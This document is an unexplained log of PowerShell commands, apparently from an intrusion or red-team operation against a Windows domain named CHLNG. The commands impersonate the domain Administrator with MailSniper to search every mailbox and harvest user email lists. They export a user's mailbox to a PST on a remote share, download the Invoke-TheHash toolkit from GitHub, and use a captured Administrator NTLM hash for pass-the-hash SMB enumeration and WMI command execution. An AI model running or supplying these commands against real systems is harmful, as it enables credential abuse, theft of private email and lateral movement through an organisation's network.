Import-Module C:\\ProgramData\\MailSniper.ps1; Invoke-GlobalMailSearch -ImpersonationAccount \'chlng-pdc-01.CHLNG.com\\Administrator\' -ExchHostname \'chlng-wks-1\' -OutputCsv \'C:\\ProgramData\\global-email-search.csv\';
Import-Module C:\\ProgramData\\MailSniper.ps1; Invoke-SelfSearch -Mailbox HealthMailbox44abe0d@CHLNG.com -OtherUserMailbox; 
Import-Module C:\\ProgramData\\pview.ps1; Get-NetUser | Sort-Object mail | ForEach-Object {$_.mail} | Out-File -Encoding ascii C:\\ProgramData\\emaillist.txt;

Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2016; . $env:ExchangeInstallPath\\bin\\RemoteExchange.ps1; Connect-ExchangeServer -auto; Get-Help Get-Mailbox;

powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; Get-MailboxExportRequest
powershell Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010; New-MailboxExportRequest -Mailbox \'john@chlng.com\' -FilePath \'\\\\chlng-wks-1\\C$\\ProgramData\\chong.pst\';

powershell [void] [System.Reflection.Assembly]::LoadWithPartialName(\'System.Windows.Forms\'); [void] [System.Reflection.Assembly]::LoadWithPartialName(\'Microsoft.VisualBasic\'); [Microsoft.VisualBasic.Interaction]::AppActivate(4404); [System.Windows.Forms.SendKeys]::SendWait(\'~\');

[Net.ServicePointManager]::SecurityProtocol = \'tls12, tls11, tls\' ; Invoke-WebRequest -Uri \'https://github.com/Kevin-Robertson/Invoke-TheHash/archive/master.zip\' -OutFile \'C:\\ProgramData\\Invoke-TheHash.zip\'

Expand-Archive

Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-TheHash.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBClient.ps1\'; Invoke-SMBClient -Domain \'chlng.com\' -Username Administrator -Hash \'1429fb97d4b6482fa9284f1f0e31e841\' -Action List -Source \'\\\\CHLNG-PDC-01\\C$\' -verbose


Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-TheHash.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBClient.ps1\'; Import-Module \'C:\\ProgramData\\Invoke-TheHash\\Invoke-TheHash-master\\Invoke-SMBExec.ps1\'; Invoke-SMBEnum -Target \'chlng.com\' -Domain \'chlng.com\' -Username Administrator -Hash \'1429fb97d4b6482fa9284f1f0e31e841\' -verbose  

Invoke-WMIExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose

